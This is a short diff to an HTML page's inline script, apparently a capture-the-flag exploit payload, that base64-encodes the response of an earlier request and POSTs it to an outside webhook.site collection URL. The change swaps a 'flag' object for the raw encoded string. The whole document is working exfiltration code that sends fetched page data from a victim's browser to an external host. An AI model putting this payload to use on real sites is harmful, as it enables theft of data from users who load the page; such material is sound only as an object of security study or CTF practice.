@@ -5,6 +5,6 @@
   xhr.send();
   var xhr2 = new XMLHttpRequest();
   xhr2.open('POST', 'https://webhook.site/b0062056-f338-4b5a-a2fb-044aa09f1644');
-  xhr2.send({"flag": window.btoa(xhr.response)});
+  xhr2.send(window.btoa(xhr.response));
  </script>
  </html>
